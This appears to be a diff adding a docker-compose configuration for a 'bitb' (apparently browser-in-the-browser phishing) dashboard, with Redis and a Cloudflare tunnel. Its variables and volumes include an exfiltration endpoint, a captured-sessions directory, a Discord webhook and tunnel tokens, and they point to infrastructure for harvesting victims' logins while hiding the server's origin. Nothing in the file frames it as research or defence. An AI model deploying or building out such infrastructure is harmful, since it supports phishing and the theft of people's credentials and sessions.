@@ -1,0 +1,50 @@
+version: '3.8'
+
+services:
+  bitb-dashboard:
+    build:
+      context: .
+      dockerfile: Dockerfile.app
+    container_name: bitb-dashboard
+    restart: unless-stopped
+    ports:
+      - "8080:8080"
+    environment:
+      - REDIS_URL=redis://redis:6379
+      - DISCORD_WEBHOOK=${DISCORD_WEBHOOK}
+      - CLOUDFLARE_TOKEN=${CLOUDFLARE_TOKEN}
+      - ADMIN_IPS=${ADMIN_IPS:-127.0.0.1}
+      - SECRET_KEY=${SECRET_KEY:-changeme}
+      - EXFIL_ENDPOINT=${EXFIL_ENDPOINT:-http://localhost:8080}
+    volumes:
+      - ./data:/data/sessions
+      - /var/run/docker.sock:/var/run/docker.sock:ro
+    networks:
+      - bitb_net
+    depends_on:
+      - redis
+
+  redis:
+    image: redis:7-alpine
+    container_name: bitb-redis
+    restart: unless-stopped
+    volumes:
+      - redis_data:/data
+    networks:
+      - bitb_net
+
+  cloudflared:
+    image: cloudflare/cloudflared:latest
+    container_name: bitb-cloudflared
+    restart: unless-stopped
+    command: tunnel --no-autoupdate run --token ${CLOUDFLARE_TUNNEL_TOKEN}
+    networks:
+      - bitb_net
+
+volumes:
+  redis_data:
+
+networks:
+  bitb_net:
+    driver: bridge
+    name: bitb_net
